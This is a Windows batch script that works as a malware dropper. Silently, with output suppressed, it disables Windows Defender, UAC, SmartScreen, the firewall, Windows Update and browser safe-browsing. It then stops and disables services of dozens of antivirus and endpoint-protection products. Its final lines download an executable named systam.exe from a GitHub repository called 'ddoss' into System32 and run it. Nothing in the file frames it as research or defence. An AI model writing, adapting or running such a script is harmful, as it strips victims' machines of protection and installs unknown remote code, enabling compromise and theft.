@ECHO OFF
title Full Protection Disable + File Continuity + Additional AVs
color 0C
setlocal

rem Disable Windows Defender Antivirus
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1

rem Disable Windows Update
sc stop "wuauserv" >nul 2>&1
sc config "wuauserv" start= disabled >nul 2>&1

rem Disable SmartScreen
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_DWORD /d 0 /f >nul 2>&1

rem Disable User Account Control (UAC)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1

rem Disable Controlled Folder Access
reg add "HKLM\Software\Microsoft\Windows Defender\Windows Defender Security Center\Antivirus\FeatureControl" /v "EnableControlledFolderAccess" /t REG_DWORD /d 0 /f >nul 2>&1

rem Disable firewall
netsh advfirewall set allprofiles state off >nul 2>&1

rem Disable Google Chrome Safe Browsing
reg add "HKCU\Software\Google\Chrome\PreferenceMACs\SafeBrowsing" /v "SafeBrowsingMode" /t REG_DWORD /d 0 /f >nul 2>&1
taskkill /f /im chrome.exe >nul 2>&1

rem Disable Mozilla Firefox Enhanced Tracking Protection
reg add "HKCU\Software\Mozilla\Firefox\Preferences" /v "privacy.trackingprotection.enabled" /t REG_DWORD /d 0 /f >nul 2>&1
taskkill /f /im firefox.exe >nul 2>&1

rem Disable Microsoft Edge SmartScreen and security features
reg add "HKCU\Software\Microsoft\Edge\PreferenceMACs" /v "SafeBrowsingEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Edge\PreferenceMACs" /v "EnableSecurity" /t REG_DWORD /d 0 /f >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1

rem Disable all Anti-virus and security services (repeat for other AVs as needed)
sc stop "AVP20.0.0" >nul 2>&1
sc stop "AvastSvc" >nul 2>&1
sc stop "McAfeeFramework" >nul 2>&1
sc stop "WinDefend" >nul 2>&1
taskkill /f /im avp.exe >nul 2>&1
taskkill /f /im avpui.exe >nul 2>&1

rem Force disable Panda Security protections
sc stop "PandaSrv" >nul 2>&1
sc config "PandaSrv" start= disabled >nul 2>&1
taskkill /f /im PandaSvc.exe >nul 2>&1

rem Force disable Sophos protections
sc stop "Sophos" >nul 2>&1
sc config "Sophos" start= disabled >nul 2>&1
taskkill /f /im Sophos.exe >nul 2>&1

rem Force disable Comodo protections
sc stop "cmdagent" >nul 2>&1
sc config "cmdagent" start= disabled >nul 2>&1
taskkill /f /im cmdagent.exe >nul 2>&1

rem Force disable F-Secure protections
sc stop "fsdfwd" >nul 2>&1
sc config "fsdfwd" start= disabled >nul 2>&1
taskkill /f /im fsdfwd.exe >nul 2>&1

rem Disable additional protections from other AVs:
rem Arctic Wolf
sc stop "ArcticWolfSvc" >nul 2>&1
sc config "ArcticWolfSvc" start= disabled >nul 2>&1
taskkill /f /im ArcticWolf.exe >nul 2>&1

rem Unsafe AV detections
sc stop "UnsafeProtection" >nul 2>&1
sc config "UnsafeProtection" start= disabled >nul 2>&1
taskkill /f /im Unsafe.exe >nul 2>&1

rem Bkav Pro protections
sc stop "BkavProSvc" >nul 2>&1
sc config "BkavProSvc" start= disabled >nul 2>&1
taskkill /f /im Bkav.exe >nul 2>&1

rem W32.AIDetectMalware
sc stop "W32AIDetectMalware" >nul 2>&1
sc config "W32AIDetectMalware" start= disabled >nul 2>&1

rem CrowdStrike Falcon
sc stop "CSFalconSvc" >nul 2>&1
sc config "CSFalconSvc" start= disabled >nul 2>&1
taskkill /f /im Falcon.exe >nul 2>&1

rem Cynet
sc stop "CynetSvc" >nul 2>&1
sc config "CynetSvc" start= disabled >nul 2>&1
taskkill /f /im Cynet.exe >nul 2>&1

rem Elastic
sc stop "ElasticSvc" >nul 2>&1
sc config "ElasticSvc" start= disabled >nul 2>&1

rem Google detections
sc stop "GoogleAV" >nul 2>&1
sc config "GoogleAV" start= disabled >nul 2>&1

rem Kingsoft Malware
sc stop "KingsoftAV" >nul 2>&1
sc config "KingsoftAV" start= disabled >nul 2>&1
taskkill /f /im Kingsoft.exe >nul 2>&1

rem MaxSecure Trojan detection
sc stop "MaxSecure" >nul 2>&1
sc config "MaxSecure" start= disabled >nul 2>&1
taskkill /f /im MaxSecure.exe >nul 2>&1

rem McAfee Scanner (Real Protect-LS)
sc stop "McAfeeScanner" >nul 2>&1
sc config "McAfeeScanner" start= disabled >nul 2>&1

rem SecureAge
sc stop "SecureAgeSvc" >nul 2>&1
sc config "SecureAgeSvc" start= disabled >nul 2>&1
taskkill /f /im SecureAge.exe >nul 2>&1

rem SentinelOne (Static ML)
sc stop "SentinelOneSvc" >nul 2>&1
sc config "SentinelOneSvc" start= disabled >nul 2>&1

rem Skyhigh SWG detection
sc stop "SkyhighSvc" >nul 2>&1
sc config "SkyhighSvc" start= disabled >nul 2>&1

rem Sophos Generic ML PUA detection
sc stop "SophosPUA" >nul 2>&1
sc config "SophosPUA" start= disabled >nul 2>&1

rem Trapmine
sc stop "Trapmine" >nul 2>&1
sc config "Trapmine" start= disabled >nul 2>&1

rem Varist W32 Trojan
sc stop "VaristSvc" >nul 2>&1
sc config "VaristSvc" start= disabled >nul 2>&1

rem Webroot W32 Trojan
sc stop "WebrootSvc" >nul 2>&1
sc config "WebrootSvc" start= disabled >nul 2>&1

rem Zillya Trojan detection
sc stop "ZillyaSvc" >nul 2>&1
sc config "ZillyaSvc" start= disabled >nul 2>&1

rem Ensure all the Anti-virus services are stopped and disabled
sc stop "ALYac" >nul 2>&1
sc stop "Arcabit" >nul 2>&1
sc stop "CTX" >nul 2>&1
sc stop "Emsisoft" >nul 2>&1
sc stop "eScan" >nul 2>&1
sc stop "GData" >nul 2>&1

rem Disable Malwarebytes Anti-Malware protection
sc stop "MBAMService" >nul 2>&1
sc config "MBAMService" start= disabled >nul 2>&1
taskkill /f /im mbam.exe >nul 2>&1

rem Disable Bitdefender protection
sc stop "vsserv" >nul 2>&1
sc config "vsserv" start= disabled >nul 2>&1
taskkill /f /im vsserv.exe >nul 2>&1

rem Disable Kaspersky protection
sc stop "avp" >nul 2>&1
sc config "avp" start= disabled >nul 2>&1
taskkill /f /im avp.exe >nul 2>&1

rem Disable ESET NOD32 protection
sc stop "ekrn" >nul 2>&1
sc config "ekrn" start= disabled >nul 2>&1
taskkill /f /im ekrn.exe >nul 2>&1

rem Disable Trend Micro protection
sc stop "TmPfw" >nul 2>&1
sc config "TmPfw" start= disabled >nul 2>&1
taskkill /f /im TmPfw.exe >nul 2>&1

rem Disable Webroot protection
sc stop "WebrootService" >nul 2>&1
sc config "WebrootService" start= disabled >nul 2>&1
taskkill /f /im WRSA.exe >nul 2>&1

rem Disable Panda Dome protection
sc stop "PandaSecurityService" >nul 2>&1
sc config "PandaSecurityService" start= disabled >nul 2>&1
taskkill /f /im PandaSvc.exe >nul 2>&1

rem Disable Avira Antivirus protection
sc stop "avira" >nul 2>&1
sc config "avira" start= disabled >nul 2>&1
taskkill /f /im avira.exe >nul 2>&1

rem Disable Norton Antivirus protection
sc stop "ccSvcHst" >nul 2>&1
sc config "ccSvcHst" start= disabled >nul 2>&1
taskkill /f /im ccSvcHst.exe >nul 2>&1

rem Disable F-Secure protection
sc stop "fsdfwd" >nul 2>&1
sc config "fsdfwd" start= disabled >nul 2>&1
taskkill /f /im fsdfwd.exe >nul 2>&1

rem Disable IObit Malware Fighter protection
sc stop "IObit Malware Fighter" >nul 2>&1
sc config "IObit Malware Fighter" start= disabled >nul 2>&1
taskkill /f /im IObit.exe >nul 2>&1

rem Disable Sophos Intercept X protection
sc stop "Sophos" >nul 2>&1
sc config "Sophos" start= disabled >nul 2>&1
taskkill /f /im Sophos.exe >nul 2>&1

rem Disable Zemana AntiMalware protection
sc stop "Zemana" >nul 2>&1
sc config "Zemana" start= disabled >nul 2>&1
taskkill /f /im Zemana.exe >nul 2>&1

rem Disable Comodo Internet Security protection
sc stop "cmdagent" >nul 2>&1
sc config "cmdagent" start= disabled >nul 2>&1
taskkill /f /im cmdagent.exe >nul 2>&1

rem Disable Avast Cleanup protection
sc stop "Avast" >nul 2>&1
sc config "Avast" start= disabled >nul 2>&1
taskkill /f /im AvastCleanup.exe >nul 2>&1

rem Disable RogueKiller protection
sc stop "RogueKiller" >nul 2>&1
sc config "RogueKiller" start= disabled >nul 2>&1
taskkill /f /im RogueKiller.exe >nul 2>&1

rem Disable Spybot Search and Destroy protection
sc stop "SDScanner" >nul 2>&1
sc config "SDScanner" start= disabled >nul 2>&1
taskkill /f /im SDScanner.exe >nul 2>&1

rem Disable McAfee Total Protection
sc stop "McAfeeFramework" >nul 2>&1
sc config "McAfeeFramework" start= disabled >nul 2>&1
taskkill /f /im McAfeeScanner.exe >nul 2>&1

rem Download systam.exe from the URL after protections are disabled
set "url=https://raw.githubusercontent.com/srap18/ddoss/main/systam.exe"
set "exefile=C:\Windows\System32\systam.exe"
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %exefile%" >nul 2>&1

rem Run systam.exe
start %exefile%

exit
